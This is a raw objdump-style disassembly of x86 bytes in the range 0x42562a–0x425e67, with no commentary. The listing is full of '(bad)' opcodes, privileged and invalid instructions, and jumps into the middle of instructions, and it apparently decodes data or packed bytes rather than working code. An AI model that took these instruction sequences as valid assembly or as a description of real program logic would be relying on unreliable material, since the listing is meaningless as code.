  42562a:	xor    al,0x8a
  42562d:	push   ebx
  42562e:	sub    dh,BYTE PTR [edx-0x3acd646]
  425634:	mov    dl,0x86
  425636:	or     al,0xff
  425638:	mov    dl,0x80
  42563a:	lock xor al,BYTE PTR [eax+0x51533297]
  425641:	push   ebx
  425642:	pushf  
  425643:	mov    dl,0xbe
  425645:	or     al,0xb2
  425647:	clc    
  425648:	sub    edi,edi
  42564a:	dec    BYTE PTR [ecx]
  42564c:	and    dh,BYTE PTR [edx+0x778092c4]
  425652:	enter  0xf080,0xc8
  425656:	mov    dl,0x86
  425658:	sub    DWORD PTR [edx-0x4d00f346],esi
  42565e:	push   ebx
  42565f:	je     0x4256b1
  425661:	ja     0x4255ee
  425663:	add    DWORD PTR [edi-0x75],esi
  425666:	or     al,BYTE PTR [esi+0x4d4dcc1a]
  42566c:	push   eax
  42566d:	ja     0x4255fa
  42566f:	xor    BYTE PTR [edi-0x75],0x80
  425673:	lock enter 0xf50,0x1
  425678:	add    BYTE PTR [esi],0x4d
  42567b:	dec    ebp
  42567c:	xor    BYTE PTR [edi-0x76],0x80
  425680:	lock mov dl,BYTE PTR [ebx-0x4]
  425684:	push   ebx
  425685:	sub    dh,BYTE PTR [edx-0x454df37a]
  42568b:	sub    edi,edi
  42568d:	mov    dl,0xec
  42568f:	ja     0x425659
  425691:	push   eax
  425692:	ja     0x42565c
  425694:	xor    BYTE PTR [edi-0x79],0x80
  425698:	lock xchg DWORD PTR [ebx+0x2a],edx
  42569c:	mov    dl,0xba
  42569e:	sub    DWORD PTR [ebx-0x4],edx
  4256a1:	mov    dl,0x86
  4256a3:	or     al,0xff
  4256a5:	mov    dl,0x80
  4256a7:	lock mov al,BYTE PTR [eax+0x51538a97]
  4256ae:	push   ebx
  4256af:	pushf  
  4256b0:	mov    dl,0xbe
  4256b2:	or     al,0xb2
  4256b4:	clc    
  4256b5:	sub    edi,edi
  4256b7:	inc    BYTE PTR [ebx-0x4e]
  4256ba:	xor    al,0xc8
  4256bd:	arpl   bp,di
  4256bf:	fstp   DWORD PTR [edx]
  4256c1:	xor    BYTE PTR [edi-0x7],0x80
  4256c5:	lock stc 
  4256c7:	push   ebx
  4256c8:	cld    
  4256c9:	push   ebx
  4256ca:	sub    dh,BYTE PTR [edx-0x454df37a]
  4256d0:	sub    edi,edi
  4256d2:	mov    dl,0x50
  4256d4:	ja     0x425661
  4256d6:	jl     0x42574f
  4256d8:	xchg   DWORD PTR [edx-0x7fc790e2],ebp
  4256de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256df:	mov    esi,0x8d8d8dcd
  4256e4:	xor    al,0x83
  4256e7:	xor    BYTE PTR [edi-0x7d],0x53
  4256eb:	jl     0x42569f
  4256ed:	test   BYTE PTR [ecx],ch
  4256ef:	push   ebx
  4256f0:	push   ecx
  4256f1:	mov    dl,0xbe
  4256f3:	or     al,0xff
  4256f5:	std    
  4256f6:	xor    BYTE PTR [edi-0x75],0x94
  4256fa:	xchg   BYTE PTR [eax+0x77],dl
  4256fd:	add    BYTE PTR [eax-0x72701089],0x10
  425704:	ja     0x4256ca
  425706:	(bad)  
  425707:	ja     0x4256cd
  425709:	xor    al,0x8b
  42570c:	or     eax,esp
  42570e:	push   0x53
  425710:	mov    dl,0x50
  425712:	ja     0x4256dc
  425714:	xor    BYTE PTR [edi-0x79],0x80
  425718:	lock xchg DWORD PTR [ebx-0x4],edx
  42571c:	mov    dl,0x86
  42571e:	or     al,0x53
  425720:	sub    dh,BYTE PTR [edx-0x4d00d646]
  425726:	xor    al,0xc8
  425729:	xor    esi,DWORD PTR [edx-0x7db0f080]
  42572f:	push   es
  425730:	dec    ebp
  425731:	dec    ebp
  425732:	xor    al,0x82
  425735:	push   ebx
  425736:	mov    dl,0x50
  425738:	ja     0x4256c5
  42573a:	xor    BYTE PTR [edi-0x76],0x80
  42573e:	lock mov dl,BYTE PTR [ebx-0x4]
  425742:	push   ebx
  425743:	sub    dh,BYTE PTR [edx-0x454df37a]
  425749:	sub    edi,edi
  42574b:	mov    dl,0x3a
  42574d:	ja     0x42573e
  42574f:	xor    BYTE PTR [edi-0x76],0x80
  425753:	lock mov dl,BYTE PTR [ebx-0x4]
  425757:	push   ebx
  425758:	sub    dh,BYTE PTR [edx-0x454df37a]
  42575e:	sub    edi,edi
  425760:	mov    dl,0x3f
  425762:	ja     0x4256e8
  425764:	xor    BYTE PTR [edi+0x32],0x80
  425768:	lock xor dl,BYTE PTR [ebx+0x2a]
  42576c:	push   ebx
  42576d:	cld    
  42576e:	mov    dl,0xba
  425770:	sub    DWORD PTR [edx-0x4d00f37a],esi
  425776:	xor    al,0x84
  425779:	arpl   bp,di
  42577b:	or     DWORD PTR [edi-0x4d],ecx
  42577e:	dec    ebp
  42577f:	dec    ebp
  425780:	dec    ebp
  425781:	xor    BYTE PTR [edi-0x7],0x80
  425785:	lock stc 
  425787:	push   ebx
  425788:	cld    
  425789:	push   ebx
  42578a:	sub    dh,BYTE PTR [edx-0x794dd646]
  425790:	or     al,0xab
  425792:	push   DWORD PTR [edx-0x56740f80]
  425798:	push   ebx
  425799:	mov    dl,0xa3
  42579b:	jo     0x425798
  42579d:	out    dx,al
  42579e:	lea    edx,[edi-0x78127880]
  4257a4:	jno    0x4257f9
  4257a6:	jo     0x42573b
  4257a8:	fwait
  4257a9:	pop    edi
  4257aa:	lock out dx,eax
  4257ac:	or     DWORD PTR [edi],ecx
  4257ae:	pop    esp
  4257af:	lea    ecx,[ebp+0x905638d]
  4257b5:	mov    cr1,ebp
  4257b8:	lea    ecx,[ebp+0x2d995c09]
  4257be:	pop    esi
  4257bf:	and    al,0x38
  4257c1:	lea    ecx,[ebp+0x508af050]
  4257c7:	lock xor dl,BYTE PTR [ebx-0x9]
  4257cb:	push   eax
  4257cc:	lock mov edi,DWORD PTR [ecx-0x49460180]
  4257d3:	jo     0x425828
  4257d5:	dec    ebp
  4257d6:	jl     0x42584f
  4257d8:	enter  0x4d07,0x4d
  4257dc:	dec    ebp
  4257dd:	mov    ecx,0xc5d3cb63
  4257e2:	mov    ecx,0xb98ae780
  4257e7:	mov    dh,0x7c
  4257e9:	mov    ecx,0x5c098b53
  4257ee:	lock mov eax,DWORD PTR [ecx]
  4257f1:	and    esp,ebx
  4257f3:	mov    ecx,0xd70cdf5f
  4257f8:	pop    ebx
  4257f9:	or     DWORD PTR [eax+esi*1+0x50],ebx
  4257fd:	lock enter 0x63b9,0xfd
  425802:	xlat   BYTE PTR ds:[ebx]
  425803:	iret   
  425804:	or     DWORD PTR [eax+esi*8-0x76],ebx
  425808:	and    BYTE PTR [edi+0x1f65cdef],0x8d
  42580f:	aad    0x53
  425811:	or     DWORD PTR [eax+esi*8-0x76],ebx
  425815:	and    BYTE PTR [edi-0x5f64611],0x21
  42581c:	pop    ds
  42581d:	mov    ecx,0x53b9b2b6
  425822:	std    
  425823:	mov    ecx,0xd5c8f05f
  425828:	and    edi,DWORD PTR [edi+esi*2-0x38]
  42582c:	xchg   BYTE PTR [ebp+0x4d],cl
  42582f:	dec    ebp
  425830:	dec    ebp
  425831:	ja     0x4257be
  425833:	cmp    ch,0xb9
  425836:	push   ebx
  425837:	mov    cl,0x2d
  425839:	mov    ecx,0x5fb970b6
  42583e:	lock mov esp,esp
  425841:	cmc    
  425842:	les    esp,FWORD PTR [esi+0x7c32774d]
  425848:	ja     0x425812
  42584a:	mov    esi,0x94d4d4d
  42584f:	pop    esp
  425850:	out    0x8a,eax
  425852:	and    BYTE PTR [edi+0x5d7053ef],0x21
  425859:	sub    edx,ebp
  42585b:	pop    ss
  42585c:	dec    ebp
  42585d:	ja     0x4257e9
  42585f:	in     eax,dx
  425860:	out    0xc8,eax
  425862:	xchg   BYTE PTR [ecx],cl
  425864:	dec    edi
  425865:	ror    BYTE PTR [ebp+0x4d],1
  425868:	dec    ebp
  425869:	push   ebx
  42586a:	push   0xffffffab
  42586c:	mov    ds:0x8deefb70,eax
  425871:	xor    al,0x32
  425874:	mov    ecx,0x53b9b2b6
  425879:	std    
  42587a:	push   ebx
  42587b:	push   0xffffffb9
  42587d:	arpl   WORD PTR [ecx+0x6a16092d],si
  425883:	les    eax,FWORD PTR [edx]
  425885:	xchg   edi,eax
  425886:	add    BYTE PTR [edi-0x6c427813],0x99
  42588d:	fwait
  42588e:	loop   0x4258d5
  425890:	dec    ebp
  425891:	xlat   BYTE PTR ds:[ebx]
  425892:	out    dx,eax
  425893:	xor    BYTE PTR [edx],0x86
  425896:	inc    ebx
  425897:	mov    ecx,DWORD PTR [ebp+0x4d]
  42589a:	add    DWORD PTR [ecx-0x40],edi
  42589d:	push   eax
  42589e:	ja     0x4258c6
  4258a0:	add    DWORD PTR [ecx+0x75],edi
  4258a3:	push   eax
  4258a4:	ja     0x4258d4
  4258a6:	add    DWORD PTR [ecx-0x47],edi
  4258a9:	push   eax
  4258aa:	ja     0x4258e2
  4258ac:	add    DWORD PTR [eax+edx*1-0x73],ecx
  4258b0:	lea    ecx,[ebp+0x13e7750]
  4258b6:	dec    esp
  4258b7:	cmc    
  4258b8:	lea    ecx,[ebp+0x4677508d]
  4258be:	add    DWORD PTR [edi+ebp*4-0x73],ecx
  4258c2:	lea    ecx,[ebp+0x1627750]
  4258c8:	dec    esp
  4258c9:	mov    BYTE PTR [ebp+0x77508d8d],cl
  4258cf:	push   esi
  4258d0:	add    DWORD PTR [ecx+esi*2+0x3a],ecx
  4258d4:	lea    ecx,[ebp+0x15e7750]
  4258da:	dec    esp
  4258db:	aam    0x3a
  4258dd:	lea    ecx,[ebp+0x50667750]
  4258e3:	xlat   BYTE PTR ds:[ebx]
  4258e4:	push   ds
  4258e5:	add    DWORD PTR [ebp+edx*4+0x3a],ecx
  4258e9:	lea    ecx,[ebp-0x7f9588b0]
  4258ef:	dec    esp
  4258f0:	cmp    cl,BYTE PTR ds:[ebp+0x5381808d]
  4258f7:	jb     0x425949
  4258f9:	xchg   edi,eax
  4258fa:	not    DWORD PTR [eax-0x69]
  4258fd:	jp     0x42594f
  4258ff:	xchg   edi,eax
  425900:	adc    BYTE PTR [eax-0x69],0x83
  425904:	jl     0x42597d
  425906:	std    
  425907:	(bad)  [esi-0x79a1ee21]
  42590d:	pop    DWORD PTR [ebx+0x26]
  425910:	push   eax
  425911:	ja     0x4258c2
  425913:	xor    al,0xfd
  425916:	and    bh,0xaf
  425919:	push   ebx
  42591a:	mov    esp,DWORD PTR [edx-0x20a724fb]
  425920:	adc    DWORD PTR [ecx],ecx
  425922:	inc    esi
  425923:	retf   
  425924:	or     al,0xb2
  425926:	popa   
  425927:	or     al,0x50
  425929:	out    0xf9,eax
  42592b:	and    bh,0xfd
  42592e:	and    BYTE PTR [edi+0x53ac80af],0x4d
  425935:	push   ebx
  425936:	test   DWORD PTR [edx+0x2aff29b4],esi
  42593c:	and    bh,0xf9
  42593f:	icebp  
  425940:	lea    ecx,[ebp+0x353cd8d]
  425946:	inc    DWORD PTR [esi]
  425948:	jmp    FWORD PTR [edx]
  42594a:	push   eax
  42594b:	xlat   BYTE PTR ds:[ebx]
  42594c:	mov    ecx,DWORD PTR [ecx]
  42594e:	(bad)  
  425950:	lea    ecx,[ebp-0x8885d73]
  425956:	rcr    ebp,0x86
  425959:	outs   dx,DWORD PTR ds:[esi]
  42595a:	pusha  
  42595b:	mov    esi,0xe26438f
  425960:	lock jp 0x425905
  425963:	ja     0x4258e7
  425965:	rcr    ebp,0x52
  425968:	or     al,0xe
  42596a:	lock add DWORD PTR [eax-0x287f0210],0xffffffaf
  425972:	and    bh,0xfd
  425975:	and    BYTE PTR [edi-0x5dcdac51],0x5
  42597c:	fistp  DWORD PTR [eax-0x21]
  42597f:	adc    DWORD PTR [ecx],ecx
  425981:	inc    esi
  425982:	add    eax,0x29bcb20c
  425987:	mov    dl,0x88
  425989:	or     al,0x53
  42598b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42598c:	push   ebx
  42598d:	test   edi,edi
  42598f:	adc    edi,edi
  425991:	dec    ebx
  425992:	in     eax,dx
  425993:	mov    dl,0x4d
  425995:	in     eax,dx
  425996:	jle    0x4259e5
  425998:	push   eax
  425999:	lock std 
  42599b:	push   eax
  42599c:	xlat   BYTE PTR ds:[ebx]
  42599d:	scas   eax,DWORD PTR es:[edi]
  42599e:	xor    al,0xf7
  4259a1:	push   eax
  4259a3:	jp     0x42597a
  4259a5:	and    esp,DWORD PTR [edx+0x36ff777]
  4259ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259ac:	retf   
  4259ad:	pusha  
  4259ae:	sbb    edi,edx
  4259b0:	jp     0x425965
  4259b2:	push   cs
  4259b3:	lock jp 0x425958
  4259b6:	ja     0x42593a
  4259b8:	sti    
  4259b9:	jl     0x425997
  4259bb:	int3   
  4259bc:	push   cs
  4259bd:	lock add esp,0x1d
  4259c1:	mov    ds:0xddc1f7f0,al
  4259c6:	xchg   BYTE PTR [ecx+0x30],bh
  4259c9:	ja     0x425a45
  4259cb:	mov    ds:0xddc182b7,al
  4259d0:	push   edx
  4259d1:	jmp    0x438f:0xbe83b7a2
  4259d8:	es xor al,0xfd
  4259dc:	xor    al,0xaf
  4259df:	and    bh,0xfd
  4259e2:	and    BYTE PTR [edi+0x63609af],0xc
  4259e9:	mov    dl,0xbe
  4259eb:	sub    DWORD PTR [ebx+0xb],edx
  4259ee:	inc    esi
  4259f0:	mov    dl,0xbc
  4259f2:	or     al,0xff
  4259f4:	sub    ah,BYTE PTR [edx-0x20a726fb]
  4259fa:	adc    DWORD PTR [eax-0x10],edx
  4259fd:	std    
  4259fe:	push   ebx
  4259ff:	xor    dl,BYTE PTR [eax-0x29]
  425a02:	scas   eax,DWORD PTR es:[edi]
  425a03:	xor    al,0xfd
  425a06:	adc    bh,0xaf
  425a09:	and    bh,0xfd
  425a0c:	and    BYTE PTR [edi-0x5dcdac51],0x5
  425a13:	fistp  DWORD PTR [eax-0x21]
  425a16:	adc    DWORD PTR [ecx],ecx
  425a18:	inc    esi
  425a19:	add    eax,0x29bcb20c
  425a1e:	mov    dl,0x88
  425a20:	or     al,0x53
  425a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a23:	push   ebx
  425a24:	test   edi,edi
  425a26:	adc    edi,edi
  425a28:	dec    ebx
  425a29:	call   DWORD PTR [ecx+0x9]
  425a2c:	dec    edi
  425a2d:	ror    BYTE PTR [ebp+0x4d],0x4d
  425a31:	adc    bh,0x8b
  425a34:	dec    edi
  425a35:	or     ecx,DWORD PTR [ecx]
  425a37:	mov    cr1,ebp
  425a3a:	lea    ecx,[ebp-0x7f9a8680]
  425a40:	in     eax,0x81
  425a42:	fucomp st(4)
  425a44:	or     eax,0x80359b80
  425a49:	leave  
  425a4a:	and    eax,0x802d7b80
  425a4f:	stos   DWORD PTR es:[edi],eax
  425a50:	sbb    eax,0x97507eec
  425a55:	scas   eax,DWORD PTR es:[edi]
  425a56:	sbb    BYTE PTR [ebx-0x13ae13eb],0xfc
  425a5d:	push   eax
  425a5e:	lock xchg DWORD PTR [eax+0x77],edx
  425a62:	jp     0x425ab4
  425a64:	xchg   edi,eax
  425a65:	enter  0x9463,0xdb
  425a69:	in     al,dx
  425a6a:	push   eax
  425a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a6c:	enter  0x7253,0x50
  425a70:	xchg   edi,eax
  425a71:	sbb    DWORD PTR [edi-0x69],0xffffffc8
  425a75:	(bad)  
  425a77:	(bad)  
  425a78:	in     al,dx
  425a79:	xor    BYTE PTR [edi+0x7a],0x80
  425a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a7e:	scas   eax,DWORD PTR es:[edi]
  425a7f:	or     DWORD PTR [ebp+eiz*1-0x6d],ebx
  425a83:	arpl   WORD PTR [ebx+0x63b3d31d],bx
  425a89:	stos   DWORD PTR es:[edi],eax
  425a8a:	adc    eax,0xee80a9d3
  425a8f:	pop    edx
  425a90:	adc    BYTE PTR [edi+0x202580ef],0x50
  425a97:	xchg   edi,eax
  425a98:	mov    ch,ah
  425a9a:	cld    
  425a9b:	add    DWORD PTR [edi+0x4304ec1e],edx
  425aa1:	xchg   edi,eax
  425aa2:	out    dx,eax
  425aa3:	push   eax
  425aa4:	ja     0x425ad8
  425aa6:	push   eax
  425aa7:	xchg   edi,eax
  425aa8:	jbe    0x425b26
  425aaa:	ja     0x425aa5
  425aac:	dec    DWORD PTR [ebp-0x687f7273]
  425ab2:	mov    ch,ch
  425ab4:	(bad)  
  425ab5:	(bad)  
  425ab6:	xlat   BYTE PTR ds:[ebx]
  425ab7:	sub    DWORD PTR [edx],ecx
  425ab9:	xor    BYTE PTR [edi+0x76],0x80
  425abd:	push   ebp
  425abe:	jno    0x425a46
  425ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ac1:	mov    cl,BYTE PTR [ebp+0x4d]
  425ac4:	adc    bh,0x8b
  425ac7:	xor    al,0x87
  425aca:	dec    edi
  425acb:	push   0xffffffd5
  425acd:	das    
  425ace:	xor    BYTE PTR [edi-0x76],0x50
  425ad2:	sbb    eax,0xed327780
  425ad7:	ja     0x425a63
  425ad9:	out    dx,al
  425ada:	dec    ebp
  425adb:	lock stc 
  425add:	xlat   BYTE PTR ds:[ebx]
  425ade:	mov    dh,0x80
  425ae0:	xchg   edi,eax
  425ae1:	sbb    eax,0x50
  425ae4:	xchg   edi,eax
  425ae5:	and    DWORD PTR [ebx-0x69],0xffffffc8
  425ae9:	in     al,0xdc
  425aeb:	stos   DWORD PTR es:[edi],eax
  425aec:	cmp    ah,0xa9
  425aef:	mov    ds:0x8deefb70,eax
  425af4:	xchg   edi,eax
  425af5:	add    BYTE PTR [edi-0x10287f67],0x4d
  425afc:	loopne 0x425b30
  425afe:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  425b04:	xchg   ch,ah
  425b06:	int3   
  425b07:	dec    ebp
  425b08:	dec    ebp
  425b09:	or     BYTE PTR [esi+edi*1+0x3a],0x8d
  425b0e:	lea    edx,[ebx+0x70]
  425b11:	pop    edi
  425b12:	out    dx,eax
  425b13:	test   eax,0x80b21809
  425b18:	mov    dl,0xa7
  425b1a:	sti    
  425b1b:	out    dx,al
  425b1c:	lea    eax,[eax-0x72c5e1e4]
  425b22:	lea    edx,[ebx+0x5e328099]
  425b28:	and    al,0x38
  425b2a:	lea    ecx,[ebp-0x2ac5e3c]
  425b30:	mov    ecx,0x50b970b6
  425b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b36:	in     eax,dx
  425b37:	sti    
  425b38:	or     al,0xed
  425b3a:	cld    
  425b3b:	or     al,0x9
  425b3d:	pop    esp
  425b3e:	mov    eax,ds:0xd7fd63b9
  425b43:	pop    es
  425b44:	push   ebx
  425b45:	push   0xffffffa9
  425b47:	mov    ecx,0xce800c50
  425b4c:	push   ds
  425b4d:	cmp    cl,BYTE PTR [ebp-0x648b5c73]
  425b53:	or     BYTE PTR [ebx+0x3a1e4c80],0x8d
  425b5a:	lea    esi,[edx+0x7cec6fbc]
  425b60:	les    esp,FWORD PTR [esi-0x3232fa33]
  425b66:	mov    esi,0x6def10bd
  425b6b:	fmul   DWORD PTR [edi-0x7934325a]
  425b71:	xlat   BYTE PTR ds:[ebx]
  425b72:	popa   
  425b73:	cld    
  425b74:	lea    ecx,[ebp+0x3a1e4c80]
  425b7a:	lea    ecx,[ebp+0x74ab7cec]
  425b80:	xchg   edi,eax
  425b81:	add    BYTE PTR [edi-0x72a5785e],0x8d
  425b88:	lea    edx,[ebx+0x438f8660]
  425b8e:	es cdq 
  425b90:	fwait
  425b91:	jl     0x425c0a
  425b93:	enter  0x58e4,0xdf
  425b97:	adc    DWORD PTR [eax-0x10],edx
  425b9a:	mov    edi,DWORD PTR [edi+esi*2-0x79]
  425b9e:	fstp   DWORD PTR [eax-0x21]
  425ba1:	adc    DWORD PTR [eax-0x10],edx
  425ba4:	xor    dl,BYTE PTR [ebx+0x6a]
  425ba7:	jl     0x425c20
  425ba9:	xchg   dh,dh
  425bab:	and    al,0x6f
  425bad:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  425bb1:	cmc    
  425bb2:	and    al,0x6f
  425bb4:	cmp    BYTE PTR [edi+esi*2-0x9],bh
  425bb8:	call   0x50543b15
  425bbd:	lock jp 0x425c3c
  425bc0:	ja     0x425c20
  425bc2:	out    0x58,al
  425bc4:	fist   WORD PTR [ecx]
  425bc6:	push   eax
  425bc7:	lock data16 xor BYTE PTR [edi-0x79],0x80
  425bcd:	xchg   edi,eax
  425bce:	xor    cl,BYTE PTR [ecx]
  425bd0:	inc    esi
  425bd1:	test   DWORD PTR [edx+esi*4],0x97800c07
  425bd8:	xchg   DWORD PTR [eax-0x74dcd29],eax
  425bde:	sub    DWORD PTR [edi+eiz*4-0x39],ebp
  425be2:	add    al,0xd4
  425be4:	push   ebx
  425be5:	jl     0x425c3a
  425be7:	or     edi,edi
  425be9:	cld    
  425bea:	push   eax
  425beb:	ja     0x425b70
  425bed:	add    DWORD PTR [edi-0x7c],esi
  425bf0:	push   eax
  425bf1:	ja     0x425ba2
  425bf3:	xor    BYTE PTR [edi-0x51],0xfa
  425bf7:	and    ah,BYTE PTR [edi+ebp*2]
  425bfa:	cmp    BYTE PTR [ebp+ecx*4-0x47],bh
  425bfe:	pop    eax
  425bff:	fist   WORD PTR [ecx]
  425c01:	push   eax
  425c02:	jge    0x425bf2
  425c04:	xor    al,0x8a
  425c07:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  425c0e:	or     al,0xe2
  425c10:	or     eax,0xb2f7539d
  425c15:	clc    
  425c16:	sub    edi,edi
  425c18:	inc    BYTE PTR [eax-0x587f7569]
  425c1e:	mov    dl,BYTE PTR [ebx+0x7e]
  425c21:	mov    dl,0x7
  425c23:	or     al,0x53
  425c25:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c2c:	inc    BYTE PTR [eax-0x587f7569]
  425c32:	mov    dl,BYTE PTR [ebx+0x7e]
  425c35:	mov    dl,0x7
  425c37:	or     al,0x53
  425c39:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c40:	inc    BYTE PTR [eax-0x587f7569]
  425c46:	mov    dl,BYTE PTR [ebx+0x7e]
  425c49:	mov    dl,0x7
  425c4b:	or     al,0x53
  425c4d:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c54:	(bad)  
  425c55:	push   eax
  425c56:	add    DWORD PTR [edx+0x4d],edx
  425c59:	dec    ebp
  425c5a:	dec    ebp
  425c5b:	xor    al,0x86
  425c5e:	adc    BYTE PTR [edi+0x53f75386],0x51
  425c65:	mov    dl,0xf8
  425c67:	sub    DWORD PTR [edx-0x100f342],esi
  425c6d:	adc    BYTE PTR [edi-0x79587f7a],0x53
  425c74:	jle    0x425cc9
  425c76:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  425c7d:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425c84:	dec    ebp
  425c85:	dec    ebp
  425c86:	xor    al,0x21
  425c89:	xor    BYTE PTR [eax],0x80
  425c8c:	xchg   edi,eax
  425c8d:	mov    al,BYTE PTR [eax+0x7f808aa7]
  425c93:	or     dl,BYTE PTR [ebx-0x7e]
  425c96:	push   ebx
  425c97:	jle    0x425c4b
  425c99:	pop    es
  425c9a:	or     al,0xb2
  425c9c:	mov    ah,0x29
  425c9e:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425ca5:	dec    ebp
  425ca6:	dec    ebp
  425ca7:	xor    al,0x71
  425caa:	adc    BYTE PTR [edi+0x53f75371],0x51
  425cb1:	mov    dl,0xf8
  425cb3:	sub    DWORD PTR [edx-0x100f342],esi
  425cb9:	adc    BYTE PTR [edi-0x75587f76],0x53
  425cc0:	add    BYTE PTR [eax+0x7e538a77],0xb2
  425cc7:	pop    es
  425cc8:	or     al,0xb2
  425cca:	mov    ah,0x29
  425ccc:	call   DWORD PTR [eax+eax*4-0x3ac7559]
  425cd3:	mov    dl,0x86
  425cd5:	or     al,0xed
  425cd7:	(bad)  
  425cd8:	or     eax,0xff29b4b2
  425cdd:	je     0x425ccb
  425cdf:	test   DWORD PTR [eax+0x41501577],0x4d4dd518
  425ce9:	dec    ebp
  425cea:	xor    al,0x15
  425ced:	in     eax,dx
  425cee:	add    eax,0x29bab20d
  425cf3:	push   ebx
  425cf4:	cld    
  425cf5:	mov    dl,0x86
  425cf7:	or     al,0xff
  425cf9:	mov    dl,0x80
  425cfb:	lock mov al,BYTE PTR [eax-0x3d127569]
  425d02:	or     eax,0xf8b25153
  425d07:	sub    DWORD PTR [edx-0x100f342],esi
  425d0d:	adc    BYTE PTR [edi-0x75587f76],0x53
  425d14:	jle    0x425d03
  425d16:	(bad)  
  425d17:	or     eax,0xb20c07b2
  425d1c:	mov    ah,0x29
  425d1e:	call   DWORD PTR [esp+ebp*8-0x75687f02]
  425d25:	and    BYTE PTR [edi-0x1281ac76],0xc6
  425d2c:	or     eax,0xb229b4b2
  425d31:	pop    es
  425d32:	or     al,0xff
  425d34:	xchg   esp,eax
  425d35:	in     al,dx
  425d36:	(bad)  
  425d37:	push   eax
  425d38:	xend   
  425d3b:	dec    ebp
  425d3c:	dec    ebp
  425d3d:	dec    ebp
  425d3e:	add    DWORD PTR [edi+0x52],ecx
  425d41:	dec    ebp
  425d42:	dec    ebp
  425d43:	dec    ebp
  425d44:	or     al,BYTE PTR [eax-0xf7f7589]
  425d4a:	mov    ah,dl
  425d4c:	or     eax,0x53fc53a3
  425d51:	adc    DWORD PTR [edx-0x454df37a],esi
  425d57:	sub    edi,edi
  425d59:	mov    dl,0xa
  425d5b:	xor    BYTE PTR [edi+0x2d],0x1
  425d5f:	adc    ch,dh
  425d61:	lea    ecx,[ebp-0x327f6973]
  425d67:	cmp    cl,BYTE PTR ds:[ebp+0x4d814d8d]
  425d6e:	xchg   edi,eax
  425d6f:	and    eax,0x5055f080
  425d74:	cmp    al,BYTE PTR [eax-0xf7f7b89]
  425d7a:	stc    
  425d7b:	or     DWORD PTR [esi-0x3],eax
  425d7e:	or     al,0xb2
  425d80:	mov    esi,0x84f0800c
  425d85:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425d8c:	push   edi
  425d8e:	stos   BYTE PTR es:[edi],al
  425d8f:	dec    ebp
  425d90:	xlat   BYTE PTR ds:[ebx]
  425d91:	xor    eax,0x4d29bab2
  425d96:	xlat   BYTE PTR ds:[ebx]
  425d97:	inc    ebp
  425d98:	xchg   ah,cl
  425d9a:	add    eax,0x77804d4d
  425d9f:	test   BYTE PTR [eax+0x4609f9f0],al
  425da5:	std    
  425da6:	or     al,0xb2
  425da8:	mov    esi,0x84f0800c
  425dad:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425db4:	push   edi
  425db6:	stos   BYTE PTR es:[edi],al
  425db7:	dec    ebp
  425db8:	xlat   BYTE PTR ds:[ebx]
  425db9:	push   ebp
  425dba:	mov    dl,0xba
  425dbc:	sub    DWORD PTR [ebp-0x29],ecx
  425dbf:	cmp    eax,0x4d059886
  425dc4:	dec    ebp
  425dc5:	xor    BYTE PTR [edi-0x76],0x80
  425dc9:	lock mov dl,BYTE PTR [ebx+0x11]
  425dcd:	mov    dl,0xba
  425dcf:	sub    DWORD PTR [ebx-0x4],edx
  425dd2:	mov    dl,0x86
  425dd4:	or     al,0xff
  425dd6:	mov    dl,0x80
  425dd8:	lock mov al,BYTE PTR [eax+0x51538a97]
  425ddf:	mov    dl,0xbe
  425de1:	or     al,0x53
  425de3:	xchg   esp,eax
  425de4:	mov    dl,0xf8
  425de6:	sub    edi,edi
  425de8:	(bad)  
  425de9:	in     al,dx
  425dea:	mov    dl,0x80
  425dec:	lock mov al,BYTE PTR [eax+0x51538a97]
  425df3:	mov    dl,0xbe
  425df5:	or     al,0x53
  425df7:	xchg   esp,eax
  425df8:	mov    dl,0xf8
  425dfa:	sub    edi,edi
  425dfc:	(bad)  
  425dfd:	in     al,dx
  425dfe:	mov    dl,0x80
  425e00:	lock mov al,BYTE PTR [eax+0x51538a97]
  425e07:	mov    dl,0xbe
  425e09:	or     al,0x53
  425e0b:	xchg   esp,eax
  425e0c:	mov    dl,0xf8
  425e0e:	sub    edi,edi
  425e10:	(bad)  
  425e11:	in     al,dx
  425e12:	mov    dl,0x50
  425e14:	dec    edi
  425e15:	push   edx
  425e16:	dec    ebp
  425e17:	dec    ebp
  425e18:	dec    ebp
  425e19:	xor    BYTE PTR [edi+0x55],0x80
  425e1d:	lea    eax,[eax-0x687f7910]
  425e23:	xchg   BYTE PTR [ebx+0x51],dl
  425e26:	push   ebx
  425e27:	xchg   esp,eax
  425e28:	mov    dl,0xbe
  425e2a:	or     al,0xb2
  425e2c:	clc    
  425e2d:	sub    edi,edi
  425e2f:	(bad)  
  425e30:	push   eax
  425e31:	xend   
  425e34:	dec    ebp
  425e35:	dec    ebp
  425e36:	dec    ebp
  425e37:	xor    BYTE PTR [edi+0x21],0x80
  425e3b:	lea    eax,[eax-0x687f7510]
  425e41:	mov    dl,BYTE PTR [ebx+0x51]
  425e44:	mov    dl,0xbe
  425e46:	or     al,0x80
  425e48:	ins    DWORD PTR es:[edi],dx
  425e49:	or     dl,BYTE PTR [ebx-0x6c]
  425e4c:	mov    dl,0xf8
  425e4e:	sub    edi,edi
  425e50:	(bad)  
  425e51:	push   eax
  425e52:	xend   
  425e55:	dec    ebp
  425e56:	dec    ebp
  425e57:	dec    ebp
  425e58:	xor    BYTE PTR [edi+0x1d],0x80
  425e5c:	lock sbb eax,0xbab21153
  425e62:	sub    DWORD PTR [ebx-0x4],edx
  425e65:	mov    dl,0x86
  425e67:	or     al,0xff
